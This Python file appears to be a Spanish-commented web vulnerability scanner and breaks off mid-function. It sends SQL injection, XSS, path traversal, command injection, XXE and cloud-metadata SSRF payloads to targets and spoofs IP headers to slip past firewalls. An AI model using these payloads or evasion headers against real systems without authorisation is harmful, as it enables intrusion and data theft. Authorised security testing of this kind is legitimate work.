import os
import importlib.util
from weasyprint import HTML as WeasyHTML
import whois
import shodan
import asyncio
import aiohttp
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
#🕷️ ULTRA PROFESSIONAL WEB VULNERABILITY SCANNER v3.0
#Herramienta avanzada de pentesting web para fines educativos
#⚠️  SOLO USAR EN SITIOS PROPIOS O CON AUTORIZACIÓN EXPLÍCITA
#!/usr/bin/env python3

# === IMPORTACIONES AVANZADAS ===
import requests
import urllib3
import sys
import time
import json
import re
import threading
import ssl
import socket
from urllib.parse import urljoin, urlparse, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import argparse
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple, Set
import hashlib
import base64
import random
import string
from bs4 import BeautifulSoup
import dns.resolver
import subprocess
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import whois

# Deshabilitar warnings SSL para testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === CONFIGURACIÓN DE COLORES ===
class Colors:
    """Códigos ANSI para colores en terminal"""
    HEADER = '\033[95m'      # Púrpura para encabezados
    OKBLUE = '\033[94m'      # Azul para información
    OKCYAN = '\033[96m'      # Cian para detalles
    OKGREEN = '\033[92m'     # Verde para éxito/seguro
    WARNING = '\033[93m'     # Amarillo para advertencias  
    FAIL = '\033[91m'        # Rojo para vulnerabilidades
    CRITICAL = '\033[1;91m'  # Rojo intenso para crítico
    BOLD = '\033[1m'         # Negrita
    UNDERLINE = '\033[4m'    # Subrayado
    END = '\033[0m'          # Reset

# === CLASES DE DATOS PARA RESULTADOS ===
@dataclass
class Vulnerability:
    """Estructura para almacenar vulnerabilidades encontradas"""
    name: str                    # Nombre de la vulnerabilidad
    severity: str               # Crítica, Alta, Media, Baja, Info
    description: str            # Descripción detallada
    location: str               # URL o parámetro afectado
    payload: str                # Payload usado para detectar
    evidence: str               # Evidencia de la vulnerabilidad
    remediation: str            # Cómo solucionarla
    cvss_score: float           # Puntuación CVSS si aplica
    cwe_id: str                 # CWE ID si aplica
    timestamp: str              # Cuándo se encontró

@dataclass 
class TechInfo:
    """Información de tecnologías detectadas"""
    name: str                   # Nombre de la tecnología
    version: str                # Versión detectada
    confidence: int             # Nivel de confianza (0-100)
    source: str                 # Cómo se detectó (header, html, etc)

@dataclass
class ScanResult:
    """Resultado completo del escaneo"""
    target_url: str             # URL objetivo
    scan_start: str             # Inicio del escaneo
    scan_end: str               # Fin del escaneo
    vulnerabilities: List[Vulnerability]  # Vulnerabilidades encontradas
    technologies: List[TechInfo]          # Tecnologías detectadas
    ssl_info: Dict              # Información SSL/TLS
    server_info: Dict           # Información del servidor
    directories_found: List[str] # Directorios encontrados
    total_requests: int         # Total de requests realizados
    scan_duration: float        # Duración total

class WebVulnScanner:
    def run_nikto(self, target_url, port=80):
        """Ejecuta Nikto contra el objetivo y muestra la salida."""
        import subprocess
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        host = parsed.hostname
        scheme = parsed.scheme
        if scheme == 'https':
            port = 443
        elif scheme == 'http':
            port = 80
        nikto_cmd = [
            'nikto',
            '-host', host,
            '-port', str(port),
            '-nointeractive'
        ]
        print(f"{Colors.OKCYAN}▶️ Ejecutando Nikto: {' '.join(nikto_cmd)}{Colors.END}")
        try:
            result = subprocess.run(nikto_cmd, capture_output=True, text=True, timeout=300)
            print(f"{Colors.OKGREEN}Nikto output:{Colors.END}\n{result.stdout}")
            if result.stderr:
                print(f"{Colors.WARNING}Nikto stderr:{Colors.END}\n{result.stderr}")
        except FileNotFoundError:
            print(f"{Colors.FAIL}❌ Nikto no está instalado o no se encuentra en el PATH.{Colors.END}")
        except Exception as e:
            print(f"{Colors.FAIL}❌ Error ejecutando Nikto: {e}{Colors.END}")
    # === ANÁLISIS AVANZADO DE HEADERS Y COOKIES ===
    def analyze_advanced_headers(self, response: requests.Response):
        print(f"{Colors.OKBLUE}🔬 Analizando headers y cookies avanzados...{Colors.END}")
        # Revisar cookies inseguras
        if 'set-cookie' in response.headers:
            cookies = response.headers.get('set-cookie','')
            if 'httponly' not in cookies.lower():
                self._add_vulnerability(
                    "Cookie sin HttpOnly",
                    "Low",
                    "Cookie de sesión sin atributo HttpOnly detectado",
                    self.target_url,
                    payload="",
                    evidence=cookies,
                    remediation="Agregar atributo HttpOnly a las cookies de sesión",
                    cvss_score=2.7,
                    cwe_id="CWE-1004"
                )
        print(f"{Colors.OKBLUE}🌐 Probando SSRF...{Colors.END}")
        payloads = ["http://127.0.0.1:80", "http://localhost:80", "http://169.254.169.254/latest/meta-data/"]
        for p in payloads:
            test_url = f"{self.target_url}?url={p}"
            resp = self._make_request(test_url)
            if resp and ("EC2" in resp.text or "root:x" in resp.text):
                self._add_vulnerability("SSRF", "Critical", "Server Side Request Forgery detectado", test_url)
        # ...existing code...

    def test_xxe(self, url):
        print(f"{Colors.OKBLUE}📄 Probando XXE...{Colors.END}")
        xxe_payload = """<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"""
        headers = {'Content-Type': 'application/xml'}
        resp = self._make_request(url, method='POST', data=xxe_payload, headers=headers)
        if resp and 'root:x' in resp.text:
            self._add_vulnerability("XXE", "Critical", "XML External Entity detectado", url)

    def test_csrf(self, url):
        print(f"{Colors.OKBLUE}🔄 Probando CSRF...{Colors.END}")
        resp = self._make_request(url)
        if resp and 'csrf' not in resp.text.lower():
            self._add_vulnerability("CSRF", "Medium", "No se detectó protección CSRF", url)

    # === AUTO-ACTUALIZACIÓN DE PAYLOADS Y WORDLISTS ===
    def update_payloads(self, url="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt", dest="wordlists/common.txt"):
        print(f"{Colors.OKCYAN}⬇️  Descargando wordlist actualizada...{Colors.END}")
        r = requests.get(url)
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, 'w') as f:
            f.write(r.text)
        print(f"{Colors.OKGREEN}✅ Wordlist actualizada: {dest}{Colors.END}")

    # === SOPORTE PARA PLUGINS/EXTENSIONES ===
    def load_plugins(self, plugins_dir="plugins"):
        print(f"{Colors.OKCYAN}🔌 Cargando plugins...{Colors.END}")
        if not os.path.isdir(plugins_dir):
            print(f"{Colors.WARNING}No hay directorio de plugins.{Colors.END}")
            return
        for fname in os.listdir(plugins_dir):
            if fname.endswith('.py'):
                spec = importlib.util.spec_from_file_location(fname[:-3], os.path.join(plugins_dir, fname))
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                if hasattr(mod, 'run'):
                    print(f"{Colors.OKGREEN}▶️  Ejecutando plugin: {fname}{Colors.END}")
                    mod.run(self)

    # === ANÁLISIS DE JAVASCRIPT Y ENDPOINTS DINÁMICOS ===
    def analyze_js_endpoints(self, url):
        print(f"{Colors.OKBLUE}🕸️  Analizando endpoints JS...{Colors.END}")
        resp = self._make_request(url)
        if not resp or not resp.text:
            print(f"{Colors.WARNING}No se pudo obtener la página para analizar JS.{Colors.END}")
            return []
        soup = BeautifulSoup(resp.text, 'html.parser')
        scripts = soup.find_all('script')
        endpoints = set()
        for s in scripts:
            src = s.get('src')
            if src and src.startswith('http'):
                try:
                    js_resp = self._make_request(src)
                    if js_resp and js_resp.text:
                        found = re.findall(r'https?://[\w./-]+', js_resp.text)
                        endpoints.update(found)
                except Exception:
                    continue
        print(f"{Colors.OKCYAN}🔎 Endpoints JS encontrados: {list(endpoints)[:5]}...{Colors.END}")
        return list(endpoints)

    # === EXPORTACIÓN HTML Y PDF AVANZADA ===
    def export_report_html(self, filename=None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            domain = urlparse(self.target_url).netloc.replace(':', '_')
            filename = f"vuln_scan_{domain}_{timestamp}.html"
        html = f"""
        <html><head><title>Web Vulnerability Scan Report</title></head><body>
        <h1>WEB VULNERABILITY SCAN REPORT</h1>
        <b>Target:</b> {self.target_url}<br>
        <b>Scan Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br>
        <b>Total Requests:</b> {self.total_requests}<br>
        <b>Vulnerabilities Found:</b> {len(self.vulnerabilities)}<br><hr>
        <h2>VULNERABILITIES:</h2>
        <ul>
        {''.join([f'<li>[{v.severity}] {v.name} - {v.location}<br>Desc: {v.description[:100]}</li>' for v in self.vulnerabilities[:50]])}
        </ul>
        </body></html>
        """
        with open(filename, 'w') as f:
            f.write(html)
        print(f"{Colors.OKGREEN}✅ Reporte HTML exportado: {filename}{Colors.END}")

    def export_report_pdf_advanced(self, filename=None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            domain = urlparse(self.target_url).netloc.replace(':', '_')
            filename = f"vuln_scan_{domain}_{timestamp}.pdf"
        html_file = filename.replace('.pdf', '.html')
        self.export_report_html(html_file)
        WeasyHTML(html_file).write_pdf(filename)
        print(f"{Colors.OKGREEN}✅ Reporte PDF avanzado exportado: {filename}{Colors.END}")
    # === ENUMERACIÓN DE SUBDOMINIOS ASÍNCRONA ===
    async def async_subdomain_enum(self, domain, wordlist, concurrency=50):
        found = []
        connector = aiohttp.TCPConnector(limit=concurrency)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for sub in wordlist:
                url = f"http://{sub}.{domain}"
                tasks.append(self.async_request(session, url))
            for future in asyncio.as_completed(tasks):
                status, text, headers = await future
                if status and status < 500:
                    found.append(headers.get('host', ''))
        return found

    def enumerate_subdomains(self, domain, wordlist=None):
        if wordlist is None:
            wordlist = ["www","mail","ftp","webmail","smtp","ns1","ns2","dev","test","api","admin","portal","blog","shop","cdn","assets","static","img","files","cloud","vpn","m","mobile","beta","staging","secure","dashboard","panel","auth","login","app","apps"]
        print(f"{Colors.OKBLUE}🌐 Enumerando subdominios...{Colors.END}")
        found = self.scan_urls_async([f"http://{sub}.{domain}" for sub in wordlist], concurrency=50)
        for status, text, headers in found:
            if status and status < 500:
                print(f"{Colors.OKGREEN}✅ Subdominio activo: {headers.get('host','')} ({status}){Colors.END}")
        return found

    # === FINGERPRINTING EXTERNO (SHODAN) ===
    def shodan_fingerprint(self, domain, api_key=None):
        if not api_key:
            print(f"{Colors.WARNING}⚠️  No se proporcionó API key de Shodan. Fingerprinting externo omitido.{Colors.END}")
            return None
        api = shodan.Shodan(api_key)
        try:
            host = api.host(domain)
            print(f"{Colors.OKCYAN}🔎 Shodan: {host['ip_str']} | {host.get('org','')} | {host.get('os','')} | Puertos: {host.get('ports','')}{Colors.END}")
            return host
        except Exception as e:
            print(f"{Colors.WARNING}Shodan error: {e}{Colors.END}")
            return None

    # === AUTENTICACIÓN AVANZADA (BASE) ===
    def login_form(self, url, username, password, user_field='username', pass_field='password'):
        """Ejemplo de login automático para sesiones autenticadas"""
        session = requests.Session()
        resp = session.get(url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        form = soup.find('form')
        if not form:
            print(f"{Colors.WARNING}No se encontró formulario de login en {url}{Colors.END}")
            return None
        action = form.get('action') or url
        data = {user_field: username, pass_field: password}
        for inp in form.find_all('input'):
            if inp.get('name') not in data:
                data[inp.get('name')] = inp.get('value','')
        login_url = urljoin(url, action)
        r = session.post(login_url, data=data)
        if r.status_code == 200:
            print(f"{Colors.OKGREEN}✅ Login exitoso en {login_url}{Colors.END}")
            return session
        else:
            print(f"{Colors.FAIL}❌ Login fallido en {login_url}{Colors.END}")
            return None
    # === ESCANEO ASÍNCRONO BASE ===
    async def async_request(self, session, url, method='GET', **kwargs):
        try:
            async with session.request(method, url, **kwargs) as resp:
                text = await resp.text()
                return resp.status, text, dict(resp.headers)
        except Exception as e:
            return None, str(e), {}

    async def async_scan_urls(self, urls, concurrency=20):
        results = []
        connector = aiohttp.TCPConnector(limit=concurrency)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.async_request(session, url) for url in urls]
            for future in asyncio.as_completed(tasks):
                result = await future
                results.append(result)
        return results

    def scan_urls_async(self, urls, concurrency=20):
        return asyncio.run(self.async_scan_urls(urls, concurrency))

    # === EXPORTACIÓN DE REPORTE PDF BASE ===
    def export_report_pdf(self, filename=None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            domain = urlparse(self.target_url).netloc.replace(':', '_')
            filename = f"vuln_scan_{domain}_{timestamp}.pdf"
        c = canvas.Canvas(filename, pagesize=letter)
        width, height = letter
        c.setFont("Helvetica-Bold", 16)
        c.drawString(50, height-50, "WEB VULNERABILITY SCAN REPORT")
        c.setFont("Helvetica", 10)
        c.drawString(50, height-70, f"Target: {self.target_url}")
        c.drawString(50, height-85, f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        c.drawString(50, height-100, f"Total Requests: {self.total_requests}")
        c.drawString(50, height-115, f"Vulnerabilities Found: {len(self.vulnerabilities)}")
        y = height-140
        c.setFont("Helvetica-Bold", 12)
        c.drawString(50, y, "VULNERABILITIES:")
        c.setFont("Helvetica", 9)
        y -= 20
        for vuln in self.vulnerabilities[:30]:
            c.drawString(55, y, f"[{vuln.severity}] {vuln.name} - {vuln.location}")
            y -= 12
            c.drawString(60, y, f"Desc: {vuln.description[:80]}")
            y -= 12
            if y < 80:
                c.showPage()
                y = height-50
        c.save()
        print(f"{Colors.OKGREEN}✅ Reporte PDF exportado: {filename}{Colors.END}")
    def detect_waf(self, response):
        """Detecta la presencia de un WAF por headers y contenido de la respuesta, solo una vez por escaneo"""
        if not hasattr(self, '_waf_reported'):
            self._waf_reported = set()
        waf_signatures = {
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'Akamai': ['akamai', 'akamai-ghost'],
            'Imperva': ['incapsula', 'imperva'],
            'AWS WAF': ['awselb', 'x-amzn-requestid', 'x-amz-apigw-id'],
            'F5 BIG-IP': ['bigip', 'f5-sticky'],
            'Sucuri': ['sucuri'],
            'Barracuda': ['barracuda'],
            'DenyAll': ['denyall'],
            'DDoS-Guard': ['ddos-guard'],
            'StackPath': ['stackpath-id'],
            '360 Web Application Firewall': ['360wzws'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'URLScan': ['urlscan'],
            'SafeDog': ['safedog'],
            'Yundun': ['yundun'],
            'NSFocus': ['nsfocus'],
            'FortiWeb': ['fortiweb'],
        }
        detected = []
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        for waf, sigs in waf_signatures.items():
            for sig in sigs:
                if any(sig in v for v in headers.values()):
                    detected.append(waf)
        # También buscar en el body
        body = response.text.lower() if hasattr(response, 'text') else ''
        for waf, sigs in waf_signatures.items():
            for sig in sigs:
                if sig in body:
                    detected.append(waf)
        if detected:
            detected = list(set(detected))
            key = (self.target_url, tuple(sorted(detected)))
            if key not in self._waf_reported:
                print(f"{Colors.WARNING}🛡️  WAF detectado: {', '.join(detected)}{Colors.END}")
                self._add_vulnerability(
                    name="Web Application Firewall Detectado",
                    severity="Info",
                    description=f"Se detectó la presencia de un WAF: {', '.join(detected)}",
                    location=self.target_url,
                    payload="",
                    evidence=','.join(detected),
                    remediation="Considerar técnicas de evasión de WAF para pruebas avanzadas",
                    cvss_score=0.0,
                    cwe_id="CWE-693"
                )
                self._waf_reported.add(key)
        return detected

    def _waf_evasion_headers(self):
        """Genera headers y valores para evadir WAFs comunes"""
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return {
            'X-Forwarded-For': fake_ip,
            'X-Client-IP': fake_ip,
            'X-Real-IP': fake_ip,
            'X-Originating-IP': fake_ip,
            'X-Remote-IP': fake_ip,
            'X-Remote-Addr': fake_ip,
            'Referer': self.target_url,
            'Accept-Language': random.choice(['en-US,en;q=0.9','es-ES,es;q=0.8','fr-FR,fr;q=0.7']),
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                'Mozilla/5.0 (X11; Linux x86_64)',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
                'Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0',
            ])
        }
    """Escáner principal de vulnerabilidades web"""
    
    def __init__(self, config: Dict = None):
        """Inicializa el escáner con configuración personalizable"""
        
        # Configuración por defecto
        self.config = {
            'threads': 20,
            'timeout': 10, 
            'delay': 0.1,
            'user_agent': 'Mozilla/5.0 (WebVuln-Scanner/3.0)',
            'follow_redirects': True,
            'verify_ssl': False,
            'max_depth': 3,
            'max_forms': 50
        }
        
        # Actualizar con configuración personalizada
        if config:
            self.config.update(config)
        
        # Inicializar sesión HTTP con configuraciones optimizadas
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.config['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Configurar adaptadores para optimización
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        # Variables de estado
        self.target_url = ""
        self.base_domain = ""
        self.vulnerabilities = []
        self.technologies = []
        self.directories_found = []
        self.forms_found = []
        self.total_requests = 0
        self.start_time = None
        self.stop_scanning = False
        
        # Threading
        self.lock = threading.Lock()
        
        # Cargar payloads y wordlists
        self._load_payloads()
        self._load_wordlists()
    
    def _load_payloads(self):
        """Carga payloads para diferentes tipos de vulnerabilidades"""
        
        # SQL Injection payloads
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL--",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' GROUP BY 1--+",
            "1' UNION SELECT 1,2,3--+",
            "' WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
            "<svg><animatetransform onbegin=alert('XSS')>"
        ]
        
        # Directory Traversal payloads
        self.lfi_payloads = [
            "../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\..\\etc\\passwd",
            "/var/www/html/index.php",
            "/etc/shadow",
            "/proc/version",
            "C:\\boot.ini",
            "C:\\windows\\system32\\config\\sam"
        ]
        
        # Command Injection payloads
        self.cmd_payloads = [
            "; ls",
            "| id",
            "&& whoami",
            "; cat /etc/passwd",
            "| type C:\\boot.ini",
            "; ping -c 1 127.0.0.1",
            "&& ping -n 1 127.0.0.1",
            "`id`",
            "$(whoami)",
            "; uname -a",
            "| ver",
            "&& systeminfo"
        ]
        
        # Headers para detectar tecnologías
        self.tech_headers = {
            'Server': {
                'nginx': ['nginx'],
                'apache': ['apache'],
                'iis': ['microsoft-iis', 'iis'],
                'tomcat': ['tomcat'],
                'jetty': ['jetty']
            },
            'X-Powered-By': {
                'php': ['php'],
                'asp.net': ['asp.net'],
                'express': ['express'],
                'django': ['django']
            }
        }
    
    def _load_wordlists(self):
        """Carga wordlists para directory busting"""
        
        # Directorios comunes para enumerar
        self.common_dirs = [
            "admin", "administrator", "login", "wp-admin", "phpmyadmin",
            "cpanel", "webmail", "email", "portal", "backup", "backups",
            "test", "testing", "dev", "development", "staging", "prod",
            "api", "v1", "v2", "rest", "graphql", "ws", "webservice",
            "upload", "uploads", "files", "file", "documents", "docs",
            "images", "img", "assets", "static", "css", "js", "scripts",
            "config", "configuration", "settings", "setup", "install",
            "database", "db", "mysql", "postgres", "oracle", "mssql",
            "logs", "log", "reports", "stats", "statistics", "monitor",
            "temp", "tmp", "cache", "old", "new", "bak", "backup",
            "secret", "private", "internal", "confidential", "hidden"
        ]
        
        # Archivos sensibles comunes
        self.sensitive_files = [
            "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd",
            "web.config", "crossdomain.xml", "clientaccesspolicy.xml",
            "config.php", "configuration.php", "settings.php", "database.php",
            "wp-config.php", "config.inc.php", "config.xml", "config.json",
            ".env", ".git/config", ".svn/entries", ".bzr/branch-format",
            "backup.sql", "database.sql", "dump.sql", "data.sql",
            "error.log", "access.log", "debug.log", "php.log",
            "phpinfo.php", "info.php", "test.php", "shell.php",
            ".DS_Store", "thumbs.db", "desktop.ini", ".bash_history"
        ]
    
    def _make_request(self, url: str, method: str = 'GET', data: Dict = None, 
                     headers: Dict = None, allow_redirects: bool = True) -> requests.Response:
        """Realiza una request HTTP con manejo de errores y estadísticas"""
        
        with self.lock:
            self.total_requests += 1
        
        try:
            # Agregar delay para ser menos agresivo
            if self.config['delay']:
                time.sleep(self.config['delay'])

            # Evasión de WAF: headers aleatorios y rotación de User-Agent
            req_headers = self.session.headers.copy()
            req_headers.update(self._waf_evasion_headers())
            if headers:
                req_headers.update(headers)

            # Realizar request según método
            if method.upper() == 'GET':
                response = self.session.get(
                    url,
                    timeout=self.config['timeout'],
                    verify=self.config['verify_ssl'],
                    allow_redirects=allow_redirects,
                    headers=req_headers
                )
            elif method.upper() == 'POST':
                response = self.session.post(
                    url,
                    data=data,
                    timeout=self.config['timeout'],
                    verify=self.config['verify_ssl'],
                    allow_redirects=allow_redirects,
                    headers=req_headers
                )
            else:
                response = self.session.request(
                    method,
                    url,
                    data=data,
                    timeout=self.config['timeout'],
                    verify=self.config['verify_ssl'],
                    allow_redirects=allow_redirects,
                    headers=req_headers
                )

            # Detección de WAF en cada request
            self.detect_waf(response)
            return response

        except requests.exceptions.Timeout:
            print(f"{Colors.WARNING}⏰ Timeout: {url}{Colors.END}")
            return None
        except requests.exceptions.ConnectionError:
            print(f"{Colors.FAIL}❌ Connection Error: {url}{Colors.END}")
            return None
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}❌ Request Error: {url} - {str(e)}{Colors.END}")
            return None
    
    def _add_vulnerability(self, name: str, severity: str, description: str,
                          location: str, payload: str = "", evidence: str = "",
                          remediation: str = "", cvss_score: float = 0.0, cwe_id: str = ""):
        """Agrega una vulnerabilidad a la lista de resultados"""
        
        vuln = Vulnerability(
            name=name,
            severity=severity,
            description=description,
            location=location,
            payload=payload,
            evidence=evidence,
            remediation=remediation,
            cvss_score=cvss_score,
            cwe_id=cwe_id,
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        
        with self.lock:
            self.vulnerabilities.append(vuln)
        
        # Mostrar vulnerabilidad encontrada
        severity_colors = {
            'Critical': Colors.CRITICAL,
            'High': Colors.FAIL,
            'Medium': Colors.WARNING,
            'Low': Colors.OKCYAN,
            'Info': Colors.OKBLUE
        }
        
        color = severity_colors.get(severity, Colors.END)
        print(f"{color}🔍 [{severity}] {name} - {location}{Colors.END}")
    
    def fingerprint_technologies(self, response: requests.Response):
        """Fingerprinting avanzado: detecta tecnologías y busca CVEs conocidas"""
        import requests as _requests
        if not response:
            return
        print(f"{Colors.OKBLUE}🔍 Detectando tecnologías...{Colors.END}")
        # Analizar headers HTTP
        for header_name, technologies in self.tech_headers.items():
            if header_name.lower() in response.headers:
                header_value = response.headers[header_name.lower()]
                for tech_name, signatures in technologies.items():
                    for signature in signatures:
                        if signature.lower() in header_value.lower():
                            tech = TechInfo(
                                name=tech_name.upper(),
                                version="Unknown",
                                confidence=80,
                                source=f"Header: {header_name}"
                            )
                            self.technologies.append(tech)
        # Analizar contenido HTML
        if response.text:
            content = response.text.lower()
            web_techs = {
                'WordPress': ['/wp-content/', '/wp-includes/', 'wp-json'],
                'Joomla': ['/components/', '/modules/', 'joomla'],
                'Drupal': ['/sites/default/', '/modules/', 'drupal'],
                'Django': ['csrfmiddlewaretoken', 'django'],
                'Laravel': ['laravel_session', '_token'],
                'React': ['react-dom', '__reactInternalInstance'],
                'Vue.js': ['vue.js', 'v-for', 'v-if'],
                'Angular': ['ng-app', 'angular.js', '[ng-'],
                'jQuery': ['jquery', '$.', 'jquery.min.js'],
                'Bootstrap': ['bootstrap', 'btn-primary', 'container-fluid']
            }
            for tech_name, signatures in web_techs.items():
                for signature in signatures:
                    if signature in content:
                        tech = TechInfo(
                            name=tech_name,
                            version="Unknown",
                            confidence=60,
                            source="HTML Content"
                        )
                        self.technologies.append(tech)
                        break
        # Detectar versiones específicas con regex
        version_patterns = {
            'PHP': r'x-powered-by: php/([0-9.]+)',
            'Apache': r'server: apache/([0-9.]+)',
            'nginx': r'server: nginx/([0-9.]+)',
            'jQuery': r'jquery[/-]([0-9.]+)',
            'WordPress': r'wp-(?:content|includes)/.*?ver=([0-9.]+)'
        }
        full_response = f"{str(response.headers)}\n{response.text}"
        for tech, pattern in version_patterns.items():
            match = re.search(pattern, full_response, re.IGNORECASE)
            if match:
                tech_info = TechInfo(
                    name=tech,
                    version=match.group(1),
                    confidence=90,
                    source="Version Detection"
                )
                self.technologies.append(tech_info)
        print(f"{Colors.OKGREEN}✅ {len(self.technologies)} tecnologías detectadas{Colors.END}")

        # === NUEVO: Consulta de CVEs conocidas para cada tecnología detectada ===
        for tech in self.technologies:
            tech_name = tech.name.lower()
            version = tech.version if tech.version != "Unknown" else None
            try:
                cve_url = f"https://cve.circl.lu/api/search/{tech_name}"
                if version:
                    cve_url += f"/{version}"
                resp = _requests.get(cve_url, timeout=5)
                if resp.status_code == 200:
                    cve_data = resp.json()
                    # cve_data puede ser lista o dict
                    cves = cve_data.get('data', []) if isinstance(cve_data, dict) else cve_data
                    if cves:
                        print(f"{Colors.WARNING}⚠️  CVEs encontradas para {tech.name} {tech.version}:{Colors.END}")
                        for cve in cves[:3]:  # Solo mostrar las 3 más relevantes
                            cve_id = cve.get('id', cve.get('cve', ''))
                            summary = cve.get('summary', cve.get('description', ''))
                            print(f"  - {Colors.FAIL}{cve_id}{Colors.END}: {summary[:120]}")
                            # Agregar como vulnerabilidad informativa
                            self._add_vulnerability(
                                name=f"CVE detectada: {cve_id}",
                                severity="Info",
                                description=summary,
                                location=self.target_url,
                                payload="",
                                evidence=f"{tech.name} {tech.version}",
                                remediation="Actualizar a la última versión estable",
                                cvss_score=float(cve.get('cvss', 0.0)),
                                cwe_id=cve.get('cwe', '')
                            )
            except Exception as e:
                print(f"{Colors.WARNING}⚠️  Error consultando CVEs para {tech.name}: {e}{Colors.END}")
    
    def check_ssl_configuration(self, hostname: str):
        """Analiza la configuración SSL/TLS del servidor"""
        
        print(f"{Colors.OKBLUE}🔒 Analizando configuración SSL/TLS...{Colors.END}")
        
        ssl_info = {
            'has_ssl': False,
            'cert_info': {},
            'vulnerabilities': []
        }
        
        try:
            # Intentar conexión SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    ssl_info['has_ssl'] = True
                    cert = ssock.getpeercert(binary_form=True)
                    cert_decoded = ssl.DER_cert_to_PEM_cert(cert)
                    
                    # Parsear certificado
                    cert_obj = x509.load_pem_x509_certificate(cert_decoded.encode(), default_backend())
                    
                    ssl_info['cert_info'] = {
                        'subject': str(cert_obj.subject),
                        'issuer': str(cert_obj.issuer),
                        'not_before': cert_obj.not_valid_before.strftime("%Y-%m-%d"),
                        'not_after': cert_obj.not_valid_after.strftime("%Y-%m-%d"),
                        'serial_number': str(cert_obj.serial_number),
                        'signature_algorithm': cert_obj.signature_algorithm_oid._name
                    }
                    
                    # Verificar expiración
                    if cert_obj.not_valid_after < datetime.now():
                        self._add_vulnerability(
                            "SSL Certificate Expired",
                            "High",
                            "El certificado SSL ha expirado",
                            f"https://{hostname}",
                            "",
                            f"Expiró: {cert_obj.not_valid_after}",
                            "Renovar el certificado SSL",
                            7.4,
                            "CWE-295"
                        )
                    
                    # Verificar algoritmos débiles
                    weak_algorithms = ['md5', 'sha1']
                    if any(alg in ssl_info['cert_info']['signature_algorithm'].lower() 
                           for alg in weak_algorithms):
                        self._add_vulnerability(
                            "Weak SSL Signature Algorithm",
                            "Medium",
                            "El certificado usa un algoritmo de firma débil",
                            f"https://{hostname}",
                            "",
                            f"Algoritmo: {ssl_info['cert_info']['signature_algorithm']}",
                            "Usar SHA-256 o superior",
                            5.3,
                            "CWE-327"
                        )
        
        except Exception as e:
            if "443" in str(e):
                ssl_info['has_ssl'] = False
            else:
                print(f"{Colors.WARNING}⚠️  Error analizando SSL: {str(e)}{Colors.END}")
        
        return ssl_info
    
    def directory_enumeration(self, base_url: str):
        """Enumera directorios y archivos comunes"""
        
        print(f"{Colors.OKBLUE}📁 Enumerando directorios y archivos...{Colors.END}")
        
        found_items = []
        
        def check_path(path):
            """Verifica si existe un directorio o archivo"""
